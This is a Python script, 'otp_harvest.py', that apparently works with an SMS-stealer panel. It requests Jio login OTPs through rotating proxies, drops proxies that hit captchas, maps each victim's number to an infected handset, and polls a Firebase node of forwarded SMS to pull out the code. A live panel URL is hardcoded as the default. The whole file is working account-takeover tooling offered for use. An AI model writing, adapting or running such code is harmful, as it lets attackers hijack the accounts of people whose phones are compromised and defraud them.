#!/usr/bin/env python3
"""otp_harvest.py — real-time OTP harvester for the v2 (GAS/ERAX) panel schema.

The panel keeps every forwarded SMS in a FLAT node /GlobalSms/<ts_ms> where each
record carries device_id, sim_id, from and msg.  Because the record is flat, an
OTP can be attributed to the exact handset that received it without walking
/AllSms/<dev> per device.

Flow:
  1. send an OTP to a Jio number through rotating proxies
  2. poll /GlobalSms for NEW records whose body matches the Jio OTP template
  3. return the code together with the device that received it

Usage (library):
    from otp_harvest import JioOtpHarvester
    h = JioOtpHarvester(panel_base)
    code, dev = h.request_and_wait(mobile, timeout=90)
"""

from __future__ import annotations

import json
import random
import re
import sys
import time
from pathlib import Path

import requests

sys.path.insert(0, str(Path(__file__).resolve().parent))

from farm import (OTP_RE, SEND_OTP_URL, fget, jio_session, load_proxies,
                  mark_proxy_dead, next_proxy)

LIVE_PROXY_FILE = Path(__file__).resolve().parent / "data" / "proxies_live.json"


def _live_proxies() -> list[str]:
    """Validated exits first, full pool as fallback."""
    try:
        d = json.loads(LIVE_PROXY_FILE.read_text())
        return [e["proxy"] for e in d if e.get("proxy")]
    except Exception:
        return []

JIO_OTP_RE = re.compile(
    r"(?<!\d)(\d{6})(?!\d)\s+is your One time password \(OTP\) to sign-in to your account on www\.jio\.com",
    re.I,
)


class JioOtpHarvester:
    """Send OTP -> poll /GlobalSms -> return the code."""

    def __init__(self, base: str, poll: int = 3):
        self.base = base
        self.poll = poll
        self.session = requests.Session()
        load_proxies()
        self._watermark = self._newest_ts()

    # ------------------------------------------------------------- internals
    def resolve_device(self, mobile: str) -> str:
        """Map a mobile number to the device_id that owns its SIM."""
        d = fget(self.session, self.base, "", "AllData", timeout=25)
        if not isinstance(d, dict):
            return ""
        for dev, rec in d.items():
            if isinstance(rec, dict) and str(rec.get("mobile", "")).endswith(mobile):
                return dev
        return ""

    def _newest_ts(self) -> str:
        """Highest GlobalSms key seen so far (ms epoch as string)."""
        d = fget(self.session, self.base, "", "GlobalSms",
                 {"shallow": "true"}, timeout=15)
        if not isinstance(d, dict) or not d:
            return "0"
        return max(d.keys())

    def _device_otp(self, dev: str, since_ts: float) -> str | None:
        """Newest Jio OTP forwarded by `dev` after `since_ts` (epoch seconds)."""
        d = fget(self.session, self.base, "", "GlobalSms", timeout=25)
        if not isinstance(d, dict):
            return None
        best: tuple[float, str] | None = None
        for k, v in d.items():
            if not isinstance(v, dict) or str(v.get("device_id") or "") != dev:
                continue
            body = str(v.get("msg") or "")
            m = JIO_OTP_RE.search(body)
            if not m:
                continue
            try:
                ts = float(v.get("time") or k) / 1000.0
            except (TypeError, ValueError):
                continue
            if ts >= since_ts and (best is None or ts > best[0]):
                best = (ts, m.group(1))
        return best[1] if best else None

    # ---------------------------------------------------------------- public
    def send_otp(self, mobile: str, max_tries: int = 12) -> tuple[bool, str]:
        """Fire a login OTP through rotating exits.  Returns (ok, status)."""
        live = _live_proxies()
        last = "otp_send_failed"
        for _ in range(max_tries):
            px = random.choice(live) if live else next_proxy()
            s = jio_session(px)
            try:
                r = s.post(SEND_OTP_URL,
                           json={"mobileNumber": mobile, "loginFlowType": "MOBILE",
                                 "alternateNumber": ""}, timeout=15)
            except requests.RequestException:
                if px:
                    mark_proxy_dead(px)
                last = "send_error"
                continue
            try:
                d = r.json()
            except ValueError:
                d = {}
            up = str(d.get("errorMessage", "")).upper()
            if "INVALID_JIONUMBER" in up:
                return False, "not_jio_number"
            if "LOCKED" in up:
                return False, "locked"
            if "CAPTCHA" in up or r.status_code == 429:
                if px:
                    mark_proxy_dead(px)
                last = "captcha"
                continue
            if r.status_code == 200 and not d.get("errorMessage"):
                return True, "otp_sent"
            last = f"http_{r.status_code}"
        return False, last

    def wait_for_otp(self, mobile: str, timeout: int = 90,
                     device: str | None = None) -> tuple[str | None, str]:
        """Poll /GlobalSms for a Jio OTP forwarded by `device`.

        The device is resolved from AllData when not supplied, so the code is
        attributed to the handset that owns the SIM.  Matching is by device and
        by message timestamp rather than by node key, because the panel writes
        keys out of order under load.
        Returns (otp, device_id).
        """
        dev = device if device is not None else self.resolve_device(mobile)
        if not dev:
            return None, ""
        since = time.time() - 30
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            otp = self._device_otp(dev, since)
            if otp:
                return otp, dev
            time.sleep(self.poll)
        return None, dev

    def request_and_wait(self, mobile: str, timeout: int = 90) -> dict:
        """Full cycle: send OTP, then harvest the code from the panel."""
        dev = self.resolve_device(mobile)
        if not dev:
            return {"mobile": mobile, "ok": False, "status": "device_not_found"}
        ok, status = self.send_otp(mobile)
        if not ok:
            return {"mobile": mobile, "ok": False, "status": status}
        otp, d = self.wait_for_otp(mobile, timeout=timeout, device=dev)
        return {"mobile": mobile, "ok": bool(otp), "status": "otp_harvested" if otp else "timeout",
                "otp": otp, "device": d}


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else \
        "https://gas3-6b801-default-rtdb.firebaseio.com"
    h = JioOtpHarvester(base)
    print("watermark:", h._watermark)
    for mob in sys.argv[2:]:
        res = h.request_and_wait(mob)
        print(json.dumps(res, ensure_ascii=False))
